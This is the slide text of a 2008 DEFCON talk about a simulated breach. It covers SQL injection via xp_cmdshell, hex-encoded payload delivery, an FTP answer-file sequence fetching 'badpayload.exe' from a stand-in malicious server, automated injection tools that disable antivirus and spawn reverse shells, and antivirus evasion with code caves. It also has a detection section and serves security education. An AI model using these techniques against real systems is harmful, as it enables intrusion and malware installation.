1 
DEFCON 16 
Black vs. White 
The complete life cycle of a real world breach… 
August 13th, 2008 
David Kennedy aka ReL1K 
Ken Stasiak aka Static 
Scott White aka Sasquatch 
Andrew Weidenhamer aka Leroy 
CD Distribution  
  Note, this presentation was made specifically for the CD distribution at
 DEFCON. The majority of the presentation is live demonstrations and rooting
 boxes. Content has been added to the presentation to reproduce some of the
 attacks we used. 
2 
Presentation Overview 
Black vs. White: The complete lifecycle of a real world breach 
  Brief introduction – 3 minutes 
  Live demonstrations (Black Hat) – 15 minutes 
  Tool demonstrations (Black Hat) – Two tools 40 minutes 
  Manual techniques – 15 minutes 
  Detecting the breach (White Hat) - 5 minutes 
  What’s the Malware doing? (White Hat) - 10 minutes 
  How we built it and got it passed AV (White Hat) – 20 minutes 
  End Presentation 
3 
The Scenario 
  Fortune 100 company hired us in 2007 to perform a penetration to simulate an
 attack. Ok. What's new? Well they wanted to see things from start to finish. 
  What we did…. Rooted them inside and out with some sweet hacks, installed
 some malware that SURPRISINGLY AV didn’t catch (uh huh). 
  Great, we did some sweet stuff... They suspect a server is compromised, what
 do you do to see if it is? Our AV isn’t doing squat, and our IPS only looks at
 the network layer, operating system, and known web server attack
 signatures... What about the web application layer? 
4 
Live Demonstration 
Live Demonstration time. 
5 
Tool Demonstrations – Special Release 
  We’ve written two custom tools specifically for DEFCON: 
  SA Exploiter Beta 
  SQLPwn Beta 
6 
The Initial Attack 
  Login Form: Simple SQL Injection ‘ throws error messages.  
7 
Error Out Baby… 
8 
9 
SQL Injection Basics 
  Basic SQL syntax: 
  SELECT  FROM  WHERE  
  Example table named ‘users’ 
  The query: 
SELECT user_id FROM users WHERE login_name = ‘admin’ AND password = ‘p455w0rd’ 
would return the value 13 
  SELECT user_id FROM users WHERE login_name = ‘admin’ AND password = ‘p455w0rd’ 
                   Injection Points 
user_id 
login_name 
password 
13 
admin 
p455w0rd 
Going Beyond ‘ OR 1=1-- 
  XP_CMDSHELL in MSSQL 
  Definition from Microsoft: Executes a given command string as an operating
-system command shell and returns any output as rows of text. Grants non
-administrative users permissions to execute xp_cmdshell. 
10 
Exploiting XP_Cmdshell 
  xp_cmdshell gives us underlying operating system privileges 
  SQL Server service/agent is installed to run as SYSTEM by default, so we’re
 running under elevated privileges... 
  Challenge with this is that we can’t generally see what’s being executed on
 the underlying operating system. Payload delivery is cludgy and takes a long
 time...might as well call it blind... 
  Blind SQL Injection poses some challenges, no good fuzzers for this out there 
11 
The Syntax 
  (As simple as it gets): ‘;exec master..xp_cmdshell ‘command here’— 
  What our attack looks like… 
12 
Binary to Hex Payload Delivery 
  Something that we haven’t seen yet is this method delivery through SQL
 Injection. 
13 
Binary to Hex 
  Taking raw binary, converting the information to formatted hex. Using echo on
 the underlying operating system to echo the hex to a text file. 
  Using Windows Debug to convert our hex back to a binary. 
  Ok so we go from binary to hex, hex through SQL, SQL to local text file as
 hex, hex into memory, and then to a binary. Phew.  
  Benefits of this are we don’t have to worry about egress filtering for things like
 FTP/TFTP delivery. 
  Some issues with Binary to Hex delivery is debug only supports 64kb file-size
 limit. We’ve gotten around this though ;)  
14 
What the payload looks like 
15 
More Advanced 
  In both tools we use a more advanced method, the limitations with binary to
 hex conversions through debug is the 64kb limit. Our delivery has to
 generally be pretty small… 
  We can get around this in a few ways, lets discuss a couple.. 
16 
Option 1 – HTTP GET 
  We can deliver a small payload (less then 4kb) that creates a raw socket and
 pulls information off of a HTTP server. 
  This method is alright, and can be customized on ports, however this method
 relies off of egress connections before establishing the connections. This is
 one too many connections for us... 
17 
Option 2 – FTP Answer Files 
  This is about as basic as it gets… 
 echo ftp 
 echo open exploitmachine.maliciousserver.com 
 echo user 
 echo password 
 echo bin 
 echo get badpayload.exe 
 echo quit 
  Problem with this is its FTP, any IDS/IPS hopefully catches this type of
 activity. It’s also several unnecessary egress connections that we don’t need.. 
18 
The Royale with Cheese  
  Here’s what we’ve come up with to bypass these restrictions… 
  We dump a small payload (5kb) onto the server, use debug to convert it from
 hex to a binary. 
  We then echo our malicious payload, whether it be 2kb or 5 gb into a file. 
  Our small payload converts hex to raw binary and to an output file.  
  No longer need to use debug for the large conversions, just for our initial
 payload. 
  We can now deliver any size binary file we want to the remote server! 
19 
SA Exploiter 
  Ok it’s a Windows GUI, but has been tested on mono/wine ;) 
  We know most DEFCON attendees main OS is Windows. 
  String generator for automated SQL Injection 
  Deliver +64kb payloads through binary payload injection in SQL 
  Add local administrators on the system, disable AV, turn on RDP, inject VNC,
 etc. etc. 
20 
SA Exploiter Copy and Paste Metasploit Shell Code 
  Metasploits famed Meterpreter delivered through SQL Injection anyone? 
21 
SA Exploiter String Generation (copy and paste) 
22 
Fuzzing Capabilities 
23 
SQLPwn 
  What is does: scans a subnet range i.e. 192.168.1.1-254 looking for port 80
 and 443. If discovered, it obtains the hostname and automatically crawls the
 entire site. 
  After the crawl, it looks at every input field/form parameter using both GET
 and POST.  
  Attacks are launched to the entire site looking for both error based SQL
 Injection and Blind SQL injection. It also has some fuzzing techniques built
 into the tool for SQL string completion.  
  Once successful injection occurs, the xp_cmdshell is enabled if disabled and
 a shell is spawned through a binary to hex payload. 
  Send +64kb payloads 
24 
Menu driven 
25 
Auto crawls the site… 
26 
The almighty reverse shell *bow* 
27 
Hmmm. Worm possibilities? 
28 
Malware Live Demonstration 
Live Demonstration time. 
29 
Reverse shell picked up by AVG 
  Reverse shell in its original form, although packed with
 API redirection it is still easily identified by antivirus
 engine. 
30 
  Here are the PE characteristics and values of our reverse shell.  Notice
 the tell-tale signs this binary is already compressed with a packer
 (VSize much larger than RSize and section flags marked as executable
 and writable). 
31 
  Since our virtual size of the section (the amount that will be loaded into memory) is much greater than what’s actually on disk, this
 means there will be many null bytes that will be used as placeholders to unpack code.  We have to be careful where we can put our
 code cave in this scenario, so that unpacked data is not overwriting or illegally accessed when we take control of the initial
 execution of the binary.  Normally, if the VSize is less than the RSize we can simply add code at the end of the section and increase
 the VSize value in order to load our new code into memory.   Since we are adding code to this area, we need to make sure that this
 area is loaded into memory and will not be accessed later on by the original unpacking stub.   Highlighted in red we have
 addess0x110 bytes for our code-cave. 
32 
Code Cave in Action 
  Our code-cave in action, when it’s done decoding it will jump to the second
-stage OEP at 00040158. 
33 
Decoding 
  The second-stage decoding is in action here, notice all the imports that are
 visible now.  We are close to the original OEP. 
34 
Decoded Data 
  Notice in the dump window (lower left-hand side) our first-section is being
 populated now with decoded data (remember it had a RSive of 0?). 
35 
  Notice the “CALL” “JMP” method to get the imports by utilizing a JMP Thunk Table.  By using this the loader does not need to fix code
 that would use those API functions, it just simply has to add the pointer value to the table for reference.  . 
36 
  If we continue our process of loading the imports we finally come to a few CALLs,
 one of which leads to the original OEP at 00401258. 
37 
The detached process used PID 5236, notice this process is not
 accessible or listed as active. 
38 
  If we drill into the programs running we will not discover any injected functions, rouge handles,
 memory hijacks, or really any evidence we ran a program called “reverse.exe”.  However, we do
 notice two cmd.exe process running under different PIDs, spawned by a separate thread of
 reverse.exe that issued a CreateProcess call.  Notice if we inspect all system-calls utilized by our
 reverse.exe program it indeed imports network capability functions from Ws2_32.dll.  So, with this
 knowledge we inspect one of the cmd.exe processes and notice a file handle of \Device\Afd, this is
 indicative of a network socket.  We have found the threaded process controlling our reverse-shell. 
39 
Our last test was to scan the binary on disk to see if we have
 bypassed the signature analysis. 
40 
Fun Topic… 6 Hacks in 6 Minutes 
  Live demonstration of 6 hacks in 6 minutes…. Ready…… set…. GO!!!! 
41 
42 
That’s all we got… 
The END???